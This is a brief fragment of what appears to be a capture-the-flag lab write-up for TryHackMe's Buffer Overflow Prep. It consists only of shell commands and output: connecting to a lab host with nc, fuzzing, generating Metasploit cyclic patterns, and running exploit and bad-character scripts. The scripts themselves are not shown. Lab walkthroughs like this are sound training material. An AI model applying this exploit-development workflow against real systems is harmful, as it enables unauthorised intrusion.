...
```
bibo318@parrot:~/CTFs/tryhackme/Buffer Overflow Prep$ nc 192.168.178.56 1337
...
```
bibo318@parrot:~/CTFs/tryhackme/Buffer Overflow Prep$ python fuzzer.py
...
```
bibo318@parrot:~/CTFs/tryhackme/Buffer Overflow Prep$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
...
```
bibo318@parrot:~/CTFs/tryhackme/Buffer Overflow Prep$ python exploit.py
Sending evil buffer...
Done!
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Buffer Overflow Prep$ python badchar.py
...
```
bibo318@parrot:~/CTFs/tryhackme/Buffer Overflow Prep$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1300
